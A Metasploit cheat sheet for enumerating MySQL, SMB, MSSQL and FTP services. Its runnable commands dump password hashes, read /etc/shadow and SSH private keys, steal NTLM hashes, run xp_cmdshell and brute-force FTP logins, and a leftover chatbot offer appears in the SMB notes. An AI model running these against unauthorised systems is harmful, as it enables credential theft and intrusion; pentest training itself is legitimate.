Metasploit provides several auxiliary and admin modules for probing, enumerating, and interacting with MySQL databases.

## Identify MySQL Service

- Check if MySQL (port 3306) is detected in workspace.

```
services -p 3306

```

## Search for MySQL Auxiliary Modules

```
search mysql type:auxiliary

```

## MySQL Scanner Modules

### MySQL Version Detection

- Retrieve MySQL server version.

```
use auxiliary/scanner/mysql/mysql_version
set RHOSTS 192.168.1.152
show options
run

```

## Run MySQL Admin & Enumeration Modules

### Execute SQL Commands (Admin)

- Run SQL commands remotely if valid credentials are available.

```
use auxiliary/admin/mysql/mysql_sql
set RHOSTS 192.168.1.239
set USERNAME root
set PASSWORD bug
run
set SQL 'show databases'
run

```

### MySQL Enumeration

- Enumerates:
• Database users
• Privileges
• Schemas
• Password policies
• Server variables

```
use auxiliary/admin/mysql/mysql_enum
set RHOSTS 192.168.1.31
set USERNAME root
set PASSWORD root
show options
run

```

## Credential & File Enumeration Modules

### Dump MySQL Password Hashes

- Useful for cracking with Hashcat/John.

```
use auxiliary/scanner/mysql/mysql_hashdump
set RHOSTS 192.168.1.239
set USERNAME root
set PASSWORD root
run

```

### File Enumeration on MySQL Server

- Attempts to read files using MySQL load_file() (if permissions allow).
• First, create/edit the file list (example using vim):

```
vim linux_file_list.txt

```

- Contents of linux_file_list.txt (full list of files to enumerate):

```
1 /etc/passwd
2 /etc/shadow
3 /etc/hosts
4 /etc/hostname
5 /etc/issue
6 /etc/os-release
7 /etc/fstab
8 /etc/mtab
9 /etc/group
10 /etc/sudoers
11 /etc/shells
12 /etc/crontab
13 /etc/ssh/ssh_config
14 /etc/ssh/sshd_config
15 /etc/mysql/my.cnf
16 /etc/mysql/mysql.conf.d/mysqld.cnf
17 /var/log/auth.log
18 /var/log/syslog
19 /var/log/dmesg
20 /var/log/nginx/access.log
21 /var/log/nginx/error.log
22 /var/log/apache2/access.log
23 /var/log/apache2/error.log
24 /root/.bash_history
25 /root/.ssh/id_rsa
26 /root/.ssh/authorized_keys
27 /home/user/.bash_history
28 /home/user/.ssh/id_rsa
29 /home/user/.ssh/authorized_keys
30 /proc/version
31 /proc/cpuinfo
32 /proc/meminfo
33 /proc/self/environ

```

```
use auxiliary/scanner/mysql/mysql_file_enum
set FILE_LIST linux_file_list.txt
set PASSWORD root
set RHOSTS 192.168.1.31
run

```

## Summary Table

| Module | Purpose |
| --- | --- |
| mysql_version | Detect MySQL version |
| mysql_sql | Execute arbitrary SQL commands |
| mysql_enum | Enumerate DB users, permissions, DBs, variables |
| mysql_hashdump | Dump MySQL user password hashes |
| mysql_file_enum | Read files on server via SQL functions |

---

# SMB Enumeration with Metasploit Auxiliary

Metasploit provides multiple auxiliary modules for enumerating SMB services, shares, users, and versions on Windows or Samba hosts.

## Enumerate SMB Version

- This module identifies the SMB version running on the target.

```
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.239
run

```

## Enumerate SMB Shares

- This module lists shared folders available on the SMB server.

```
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.168.1.239
run

```

## Enumerate SMB Users

- This module attempts to enumerate user accounts over SMB.

```
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS 192.168.1.239
run

```

## Notes

- These modules do not require authentication (unless the SMB server restricts anonymous access).
• Useful for Windows Server, Windows 10/11, Samba Linux, NAS devices, etc.
• Combine SMB enumeration findings with:
• smb_login
• psexec
• Vulnerability scanners like ms17_010_eternalblue
• If you want, I can also create a full SMB enumeration cheatsheet, including nmap + metasploit + manual commands.

---

# MSSQL Enumeration & Admin with Metasploit Auxiliary

Metasploit provides powerful auxiliary and admin modules for discovering, enumerating, and interacting with Microsoft SQL Server (MSSQL).

## Identify MSSQL Service

- Check if MSSQL (default port 1433) is detected in the workspace.

```
services -p 1433

```

## Search for MSSQL Auxiliary Modules

```
search mssql type:auxiliary

```

## MSSQL Scanner & Admin Modules

### MSSQL Enumeration (Basic Server Info)

- Retrieve MSSQL version, hostname, users, databases, and configuration.
• Enumerates:
• SQL Server version
• Login accounts & roles
• Database names
• SQL Server configuration
• xp_cmdshell availability

```
use auxiliary/admin/mssql/mssql_enum
set USERNAME sa
set PASSWORD peiuytrewq
set RHOSTS 10.11.1.31
run

```

### MSSQL NTLM Hash Stealing (Authentication Relay)

- Capture NTLMv2 hashes from SQL Server.
• Forces MSSQL to authenticate to attacker.
• Captures NTLMv2 hashes.
• Hashes can be cracked offline with Hashcat.

```
use auxiliary/admin/mssql/mssql_ntlm_stealer
set USERNAME sa
set PASSWORD poiuytrewq
set RHOSTS 10.11.1.31
run

```

### Execute System Commands with xp_cmdshell

- Remote OS command execution (Windows).
• Purpose:
• Execute Windows system commands
• Useful for privilege escalation & post-exploitation
• Can be used to create a reverse shell

```
use auxiliary/admin/mssql/mssql_exec
set RHOSTS 10.11.1.31
set USERNAME sa
set PASSWORD poiuytrewq
set CMD "ipconfig"
run

```

## Additional Notes

- xp_cmdshell Requirements:
• Must be enabled for command execution
• Metasploit attempts to enable it automatically
• Privilege Requirements:
• Requires SQL admin user (e.g., sa or sysadmin role)

## Summary Table

| Module | Purpose |
| --- | --- |
| mssql_enum | Enumerate version, DBs, users, roles, configs |
| mssql_ntlm_stealer | Capture NTLM hashes via forced authentication |
| mssql_exec | Execute OS commands using xp_cmdshell |

---

# FTP Enumeration & Scanning with Metasploit Auxiliary

Metasploit provides multiple auxiliary FTP scanner modules for:
• Fingerprinting FTP services
• Checking anonymous login
• Brute-forcing credentials

## Identify FTP Service

- Check if FTP port 21 is detected in your workspace.

```
services -p 21

```

## Search for FTP Auxiliary Modules

```
search ftp type:auxiliary

```

## FTP Scanner Modules

### FTP Version Detection

- Detects FTP banner & version.
• Useful for identifying vulnerable FTP servers.

```
use auxiliary/scanner/ftp/ftp_version
show options
set RHOSTS 192.168.1.152
services -p 21 -rhosts
run

```

### Anonymous FTP Login Check

- Checks if the server allows anonymous login.
• Many old/vulnerable systems allow read/write access.

```
use auxiliary/scanner/ftp/anonymous
show options
set RHOSTS 192.168.1.152
services -p 21 -rhosts
run

```

### FTP Login Brute-force

- Attempts to brute-force username & password.
• Supports:
• User list
• Password list
• Multi-threaded login attempts

```
use auxiliary/scanner/ftp/ftp_login
show options
set USER_FILE /opt/username.txt
set PASS_FILE /opt/password.txt
set RHOSTS 192.168.1.152
services -p 21 -rhosts
set THREADS 20
run

```

## Summary Table

| Module | Purpose |
| --- | --- |
| ftp_version | Detect banner & version of FTP server |
| anonymous | Check for anonymous login access |
| ftp_login | Brute-force FTP logins using wordlists |
